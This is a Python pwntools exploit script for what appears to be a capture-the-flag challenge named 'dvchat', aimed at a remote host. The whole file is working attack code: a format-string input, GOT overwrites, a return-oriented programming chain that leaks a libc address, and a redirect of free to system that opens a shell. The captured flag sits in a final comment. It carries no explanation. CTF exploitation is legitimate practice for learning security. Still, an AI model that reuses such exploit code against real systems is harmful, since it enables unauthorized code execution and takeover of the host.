from pwn import *
import time

context.log_level='debug'
p = remote('dvchat.eatpwnnosleep.com', 7779)
#p = process('./dvchat')

p.recvuntil("enter your ID: ")
p.send("%14$s\n")
p.recvuntil("enter your PW: ")
p.send("sh\n")

for i in xrange(8):
    p.send("beach".ljust(36) + "\n")
    p.recv(4096)

for i in xrange(13):
    p.send("duck".ljust(36) + "\n")
    p.recv(4096)


FREE_GOT = 0x603018
SCANF_PLT = 0x401170
p.send("\x7f" * 2 + p64(SCANF_PLT).replace("\x00", "") + "\x7f"*(2+9) + p64(FREE_GOT).replace("\x00", "") + "\n")
p.recv(4096)

raw_input("aa")
p.send("/quit\n")
p.recv(4096)

POP_RDI = 0x401FF3
RET = 0x401FF4
LIBC_START_MAIN_GOT = 0x6030C0
PUTS_PLT = 0x401000
GADGET1 = 0x401FEA
GADGET2 = 0x401FD0
CALL_FREE = 0x401CBB
SCANF_GOT = 0x603110
FMSTR = 0x4020B7

p.send("A"*8
        + p64(POP_RDI) + p64(LIBC_START_MAIN_GOT) + p64(PUTS_PLT)
        + p64(RET)
        + p64(CALL_FREE)
        + "A"* 64 + p64(FREE_GOT)
        + "\n")
p.recvuntil("ncurses closed\n")

LIBC_START_MAIN_OFF = 0x0000000000020740
libc_base = u64(p.readline().strip().ljust(8, "\x00")) - LIBC_START_MAIN_OFF
print("LIBC_BASE: %x" % libc_base)

SYSTEM_OFF = 0x0000000000045390
p.send(p64(libc_base + SYSTEM_OFF) + "\n")

p.interactive()

# flag: SCTF{N0P4RK1NG4TKA1ST}
